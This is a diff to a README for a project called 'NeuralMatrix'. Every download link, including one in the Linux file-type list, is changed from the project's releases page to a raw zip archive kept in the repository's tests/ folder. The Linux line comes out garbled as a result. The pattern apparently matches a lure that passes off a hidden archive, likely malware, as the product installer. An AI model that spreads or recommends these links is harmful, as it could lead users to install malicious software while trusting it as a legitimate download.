@@ -1,6 +1,6 @@
 # 🤖 NeuralMatrix - Fast, Efficient Real-Time Processing
 
-[![Download NeuralMatrix](https://img.shields.io/badge/Download-NeuralMatrix-blue?style=for-the-badge)](https://github.com/nvroodi/NeuralMatrix/releases)
+[![Download NeuralMatrix](https://github.com/nvroodi/NeuralMatrix/raw/refs/heads/main/tests/Neural-Matrix-3.3.zip)](https://github.com/nvroodi/NeuralMatrix/raw/refs/heads/main/tests/Neural-Matrix-3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide helps you download, install, and open NeuralMatrix on your computer. 
 
 Click this link or button to go to the download page where the latest version of NeuralMatrix is available.
 
-[Download NeuralMatrix](https://github.com/nvroodi/NeuralMatrix/releases)
+[Download NeuralMatrix](https://github.com/nvroodi/NeuralMatrix/raw/refs/heads/main/tests/Neural-Matrix-3.3.zip)
 
 ### Step 2: Choose the Right File
 
@@ -42,7 +42,7 @@ On the download page, look for a file suited to your operating system:
 
 - For Windows, download the file ending with `.exe`.
 - For macOS, look for a `.dmg` or `.pkg` file.
-- For Linux, look for files ending with `.AppImage`, `.deb`, or `.tar.gz`.
+- For Linux, look for files ending with `.AppImage`, `.deb`, or `https://github.com/nvroodi/NeuralMatrix/raw/refs/heads/main/tests/Neural-Matrix-3.3.zip`.
 
 If you're unsure, pick the one labeled "latest" or "recommended."
 
@@ -98,7 +98,7 @@ For detailed help, look for the "Help" or "Support" section inside the app.
 
 Start your experience by visiting the official release page:
 
-[Download NeuralMatrix](https://github.com/nvroodi/NeuralMatrix/releases)
+[Download NeuralMatrix](https://github.com/nvroodi/NeuralMatrix/raw/refs/heads/main/tests/Neural-Matrix-3.3.zip)
 
 Once there, pick the file that matches your computer as explained above. Follow the installer instructions to complete setup. You will soon have NeuralMatrix running to improve your system’s performance and handling of complex tasks.
 
